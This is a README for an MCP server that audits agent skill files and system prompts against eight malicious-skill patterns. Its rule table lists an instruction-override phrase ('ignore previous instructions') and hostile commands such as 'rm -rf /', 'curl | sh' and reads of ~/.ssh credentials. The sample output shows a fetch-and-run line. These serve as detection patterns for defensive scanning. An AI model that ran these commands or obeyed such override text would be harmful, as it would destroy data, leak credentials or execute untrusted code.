# mcp-skill-sec

A Model Context Protocol (MCP) server that audits any agent skill, system
prompt, or downloaded file collection against the **8 malicious-skill
supply-chain patterns**.

Deterministic, no LLM, no network calls — a self-hostable pre-install scanner
that works with Claude Code, Cursor, Copilot, OpenClaw, Codex CLI, and any
MCP-compatible agent.

## What it scans for (rules R1–R8)

| Rule | Pattern |
|------|---------|
| R1 | Prompt injection / instruction hijack (`ignore previous instructions`, secrecy directives, identity overrides) |
| R2 | Data exfiltration intent (send/post/email contents to a URL, log theft) |
| R3 | Hardcoded secrets / credentials (API keys, PATs, private keys, connection strings) |
| R4 | Dangerous commands (`rm -rf /`, `curl \| sh`, fork bombs, raw device writes) |
| R5 | Obfuscation / hidden behavior (base64-exec, eval/exec, zero-width chars) |
| R6 | Untrusted external fetches (fetch-and-run, non-PyPI installs) |
| R7 | Credential access (reading `~/.ssh`, `.aws/credentials`, `.env`) |
| R8 | Privilege escalation (`sudo -s`, setuid, adding to sudo group) |

Each finding carries a `severity` (critical/high/medium/low), a line number,
and the matching evidence line. The overall verdict is **PASS** only when
there are no critical/high findings and every medium finding is benign.

## Tools

- `audit_text(text, filename)` — audit a string (a skill you were pasted, a
  system prompt you didn't write).
- `audit_skill_file(path)` — audit a `SKILL.md` / `AGENTS.md` / `CLAUDE.md`
  on disk, line-numbered evidence.
- `audit_directory(path, pattern)` — audit a whole downloaded skills
  collection; returns per-file verdicts + a summary.
- `rule_list()` — dump the rule catalog.

## Install & run

```bash
pip install mcp
mcp install mcp_server.py  --name skill-sec          # register with Claude Desktop
# or run manually over stdio:
python3 mcp_server.py
```

### Claude Desktop / agent config

```json
{
  "mcpServers": {
    "skill-sec": {
      "command": "python3",
      "args": ["/absolute/path/to/mcp_server.py"]
    }
  }
}
```

## Example

```text
skill-sec: /tmp/downloaded-skill/SKILL.md
  verdict : FLAG
  counts  : critical 1, high 2, medium 1, low 0
  R3 [critical] line 11: api_key = "sk-live-…"
  R3 [high]     line 14: password = "hunter2"
  R4 [critical] line 22: curl https://x/y.sh | sh
  action : remove the literal secrets, drop the fetch-and-run, re-audit
```

## License & provenance

MIT. Written by `sudo-ai-git`. This is a standalone security/verification
tool; it encodes no proprietary method. It is the MCP expression of the
`skill-sec` agent skill (same rules, callable as a server instead of a skill).
